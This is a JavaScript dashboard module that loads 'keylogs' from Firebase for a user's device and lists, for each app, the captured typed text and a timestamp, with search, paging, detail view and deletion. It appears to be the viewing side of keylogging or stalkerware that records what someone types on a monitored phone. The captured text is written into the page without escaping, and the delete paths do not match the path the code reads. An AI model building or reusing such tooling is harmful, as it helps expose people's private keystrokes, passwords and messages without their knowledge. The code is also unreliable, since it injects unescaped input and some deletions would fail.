  import { db, auth } from "../api/firebase.js";
    import { ref, get,onValue, remove } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-database.js";
    import { onAuthStateChanged } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-auth.js";
    

   const deviceId = await getDeviceIdSafe();
   

    const tableBody = document.querySelector("#logsTable tbody");
    const mobileCardsList = document.getElementById("mobileCardsList");
    const searchInput = document.getElementById("searchInput");
    const pageSizeSelect = document.getElementById("pageSize");
    const selectAllLogs = document.getElementById("selectAllLogs");
    const selectAllLogsMobile = document.getElementById("selectAllLogsMobile");
    const deleteLogsBtn = document.getElementById("deleteLogsBtn");
    const infoText = document.getElementById("infoText");
    const mobileInfoText = document.getElementById("mobileInfoText");
    const mobileFooterText = document.getElementById("mobileFooterText");

    const successMessage = document.getElementById("successMessage");
    const successText = document.getElementById("successText");

    let allLogs = [];
    let filteredLogs = [];
    let originalLogs = [];
    let currentPage = 1;
    let pageSize = 25;
    let currentUid = null;

    export async function getDeviceIdSafe() {
  return new Promise((resolve, reject) => {
    onAuthStateChanged(auth, async (user) => {
      if (!user) return reject("Not logged in");

      const snap = await get(ref(db, `users/${user.uid}/storeId`));
      resolve(snap.val());
    });
  });
}
  
    function showSuccessMessage(count) {
      successText.textContent = count;
      successMessage.classList.add("show");
      setTimeout(() => {
        successMessage.classList.remove("show");
      }, 3000);
    }

    function updateDeleteButton() {
      const checkedBoxes = document.querySelectorAll('input[type="checkbox"][data-path]:checked');
      const count = checkedBoxes.length;

      deleteLogsBtn.disabled = count === 0;

      if (count > 0) {
        deleteLogsBtn.innerHTML = `
          <span class="delete-dot"></span>
          <span>Delete</span>
          <span class="delete-count">${count}</span>
        `;
      } else {
        deleteLogsBtn.innerHTML = `
          <span class="delete-dot"></span>
          <span>Delete Selected</span>
        `;
      }
    }

    function renderTable() {
      const start = (currentPage - 1) * pageSize;
      const end = start + pageSize;
      const pageData = filteredLogs.slice(start, end);

      // Desktop Table
      tableBody.innerHTML = "";

      if (!pageData.length) {
        tableBody.innerHTML = `
          <tr>
            <td colspan="5">
              <div class="empty-state">
                <div class="empty-state-icon">📭</div>
                <div class="empty-state-title">No logs found</div>
                <div class="empty-state-text">Try adjusting your search criteria</div>
              </div>
            </td>
          </tr>`;
        infoText.textContent = "Showing 0 to 0 of 0 entries";
      } else {
        pageData.forEach((log, index) => {
          const row = document.createElement("tr");
          row.innerHTML = `
            <td>
              <input type="checkbox"
                     data-path="users/${currentUid}/keylogs/${log.logId}"
                     data-index="${start + index}">
            </td>
            <td class="clickable-cell" data-log='${JSON.stringify(log).replace(/'/g, "&#39;")}' title="${log.app || 'Unknown'}">${log.app || 'Unknown'}</td>
            <td class="clickable-cell" data-log='${JSON.stringify(log).replace(/'/g, "&#39;")}' title="${log.text || '-'}">${log.text?.substring(0, 100) || '-'}${log.text && log.text.length > 100 ? '...' : ''}</td>
            <td class="clickable-cell" data-log='${JSON.stringify(log).replace(/'/g, "&#39;")}' title="${log.timestamp || '-'}">${log.timestamp || '-'}</td>
            <td>
              <button class="btn-small" data-single-path="users/${currentUid}/devices/${deviceId}/keylogs/${log.logId}">
                Delete
              </button>
            </td>
          `;
          tableBody.append(row);
        });

        const total = filteredLogs.length;
        infoText.textContent = `Showing ${start + 1} to ${Math.min(end, total)} of ${total.toLocaleString()} entries`;
      }

      // Mobile Cards
      renderMobileCards(pageData, start);

      updateDeleteButton();
      attachEventListeners();
    }

    function renderMobileCards(pageData, start) {
      mobileCardsList.innerHTML = "";

      if (!pageData.length) {
        mobileCardsList.innerHTML = `
          <div class="empty-state">
            <div class="empty-state-icon">📭</div>
            <div class="empty-state-title">No logs found</div>
            <div class="empty-state-text">Try adjusting your search criteria</div>
          </div>`;
        mobileInfoText.textContent = "0 entries";
        mobileFooterText.textContent = "Showing 0 to 0 of 0 entries";
        return;
      }

      pageData.forEach((log, index) => {
        const card = document.createElement("div");
        card.className = "log-card";
        card.innerHTML = `
          <div class="log-card-header">
            <input type="checkbox" class="log-card-checkbox"
                   data-path="users/${currentUid}/keylogs/${log.logId}"
                   data-index="${start + index}">
            <span class="log-card-app">${log.app || 'Unknown'}</span>
            <span class="log-card-timestamp">${log.timestamp || '-'}</span>
          </div>
          <div class="log-card-text">${log.text || '-'}</div>
          <div class="log-card-actions">
            <button class="log-card-btn view" data-log='${JSON.stringify(log).replace(/'/g, "&#39;")}'>View Details</button>
            <button class="log-card-btn delete" data-single-path="users/${currentUid}/keylogs/${log.logId}">Delete</button>
          </div>
        `;
        mobileCardsList.append(card);
      });

      const total = filteredLogs.length;
      const end = start + pageSize;
      mobileInfoText.textContent = `${total.toLocaleString()} entries`;
      mobileFooterText.textContent = `Showing ${start + 1} to ${Math.min(end, total)} of ${total.toLocaleString()} entries`;
    }

    function attachEventListeners() {
      // Single delete buttons (desktop & mobile)
      document.querySelectorAll("[data-single-path]").forEach(btn => {
        btn.onclick = async (e) => {
          e.stopPropagation();
          const path = btn.dataset.singlePath;
          try {
            await remove(ref(db, path));
            showSuccessMessage(1);
          } catch (err) {
            console.error("Error deleting log:", err);
            alert("Error deleting log. Please try again.");
          }
        };
      });

      // Clickable cells for modal (desktop)
      document.querySelectorAll(".clickable-cell").forEach(cell => {
        cell.onclick = (e) => {
          e.stopPropagation();
          const logData = JSON.parse(cell.dataset.log);
          showLogModal(logData);
        };
      });

      // View buttons (mobile)
      document.querySelectorAll(".log-card-btn.view").forEach(btn => {
        btn.onclick = (e) => {
          e.stopPropagation();
          const logData = JSON.parse(btn.dataset.log);
          showLogModal(logData);
        };
      });

      // Checkbox listeners
      document.querySelectorAll('input[type="checkbox"][data-path]').forEach(cb => {
        cb.onchange = () => {
          syncCheckboxes(cb.dataset.path, cb.checked);
          updateDeleteButton();
          updateSelectAllState();
        };
      });
    }

    // Sync checkboxes between desktop and mobile
    function syncCheckboxes(path, isChecked) {
      document.querySelectorAll(`input[type="checkbox"][data-path="${path}"]`).forEach(cb => {
        cb.checked = isChecked;
      });
    }

    function updateSelectAllState() {
      const allCheckboxes = document.querySelectorAll('input[type="checkbox"][data-path]');
      const checkedCount = document.querySelectorAll('input[type="checkbox"][data-path]:checked').length;
      const allChecked = allCheckboxes.length > 0 && checkedCount === allCheckboxes.length;
      
      selectAllLogs.checked = allChecked;
      selectAllLogsMobile.checked = allChecked;
    }

    // Modal functionality
    const logModal = document.getElementById("logModal");
    const closeModal = document.getElementById("closeModal");
    const modalBody = document.getElementById("modalBody");

    function showLogModal(log) {
      modalBody.innerHTML = `
        <div class="detail-field">
          <div class="detail-label">Application</div>
          <div class="detail-value">${log.app || 'Unknown'}</div>
        </div>
        <div class="detail-field">
          <div class="detail-label">Captured Text</div>
          <div class="detail-value">${log.text || '-'}</div>
        </div>
        <div class="detail-field">
          <div class="detail-label">Timestamp</div>
          <div class="detail-value">${log.timestamp || '-'}</div>
        </div>
        <div class="detail-field">
          <div class="detail-label">Log ID</div>
          <div class="detail-value">${log.logId}</div>
        </div>
      `;
      
      logModal.classList.add("show");
      document.body.style.overflow = "hidden";
    }

    function closeLogModal() {
      logModal.classList.remove("show");
      document.body.style.overflow = "";
    }

    closeModal.onclick = closeLogModal;
    logModal.onclick = (e) => {
      if (e.target === logModal) closeLogModal();
    };

    document.addEventListener("keydown", (e) => {
      if (e.key === "Escape" && logModal.classList.contains("show")) {
        closeLogModal();
      }
    });

    // Bulk delete
    deleteLogsBtn.onclick = async () => {
      const checkedBoxes = document.querySelectorAll('input[type="checkbox"][data-path]:checked');
      const uniquePaths = [...new Set([...checkedBoxes].map(cb => cb.dataset.path))];
      const count = uniquePaths.length;
      if (count === 0) return;

      deleteLogsBtn.disabled = true;
      deleteLogsBtn.innerHTML = `
        <span class="loading-spinner"></span>
        <span>Deleting...</span>
      `;

      let deletedCount = 0;

      try {
        for (const path of uniquePaths) {
          try {
            await remove(ref(db, path));
            deletedCount++;
          } catch (error) {
            console.error("Error deleting log:", error);
          }
        }

        if (deletedCount > 0) {
          showSuccessMessage(deletedCount);
          document.querySelectorAll('input[type="checkbox"]').forEach(cb => {
            cb.checked = false;
          });
          updateDeleteButton();
        }
      } catch (error) {
        console.error("Delete error:", error);
        alert("Error deleting logs. Please try again.");
      } finally {
        deleteLogsBtn.disabled = false;
        updateDeleteButton();
      }
    };

    // Select all (desktop)
    selectAllLogs.onchange = (e) => {
      document.querySelectorAll('input[type="checkbox"][data-path]').forEach(cb => {
        cb.checked = e.target.checked;
      });
      selectAllLogsMobile.checked = e.target.checked;
      updateDeleteButton();
    };

    // Select all (mobile)
    selectAllLogsMobile.onchange = (e) => {
      document.querySelectorAll('input[type="checkbox"][data-path]').forEach(cb => {
        cb.checked = e.target.checked;
      });
      selectAllLogs.checked = e.target.checked;
      updateDeleteButton();
    };

    // Search
    function applySearch() {
      const val = searchInput.value.toLowerCase().trim();

      if (val === "") {
        filteredLogs = [...originalLogs];
      } else {
        filteredLogs = originalLogs.filter(l =>
          (l.app || "").toLowerCase().includes(val) ||
          (l.text || "").toLowerCase().includes(val) ||
          (l.timestamp || "").toLowerCase().includes(val)
        );
      }
      currentPage = 1;
      renderTable();
    }

    function debounce(func, wait) {
      let timeout;
      return function(...args) {
        clearTimeout(timeout);
        timeout = setTimeout(() => func.apply(this, args), wait);
      };
    }

    searchInput.addEventListener("input", debounce(applySearch, 200));

    // Page size
    pageSizeSelect.onchange = (e) => {
      pageSize = parseInt(e.target.value);
      currentPage = 1;
      renderTable();
    };

    // Firebase listener
    onAuthStateChanged(auth, user => {
      if (!user) {
        currentUid = null;
        infoText.textContent = "Please sign in";
        tableBody.innerHTML = `
          <tr>
            <td colspan="5">
              <div class="empty-state">
                <div class="empty-state-icon">🔐</div>
                <div class="empty-state-title">Sign in required</div>
                <div class="empty-state-text">Please sign in to view your logs</div>
              </div>
            </td>
          </tr>`;
        mobileCardsList.innerHTML = `
          <div class="empty-state">
            <div class="empty-state-icon">🔐</div>
            <div class="empty-state-title">Sign in required</div>
            <div class="empty-state-text">Please sign in to view your logs</div>
          </div>`;
        return;
      }

      currentUid = user.uid;

      const logsRef = ref(db, `users/${currentUid}/devices/${deviceId}/keylogs`);

      onValue(logsRef, snapshot => {
        originalLogs = [];
        allLogs = [];
        
        snapshot.forEach(child => {
          const val = child.val() || {};
          
          if (!val.text || val.text.trim() === "") {
            return;
          }
          
          const log = {
            logId: child.key,
            app: val.appName || val.appPackage || "Unknown",
            text: val.text || "-",
            timestamp: val.timestamp || "-"
          };
          
          originalLogs.push(log);
          allLogs.push(log);
        });

        originalLogs.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
        filteredLogs = [...originalLogs];
        currentPage = 1;
        renderTable();
      }, (error) => {
        console.error("Firebase listener error:", error);
        tableBody.innerHTML = `
          <tr>
            <td colspan="5">
              <div class="empty-state">
                <div class="empty-state-icon">⚠️</div>
                <div class="empty-state-title">Error loading logs</div>
                <div class="empty-state-text">Please refresh the page and try again</div>
              </div>
            </td>
          </tr>`;
      });
    });